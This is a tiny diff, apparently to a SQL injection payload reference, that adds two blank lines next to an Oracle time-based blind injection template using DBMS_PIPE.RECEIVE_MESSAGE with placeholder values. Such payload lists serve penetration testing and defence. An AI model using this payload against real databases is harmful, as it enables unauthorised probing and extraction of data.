@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:23:10.381670+00:00'
 ```sql
 AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME]) comment: -- /**/
 ```
+
+
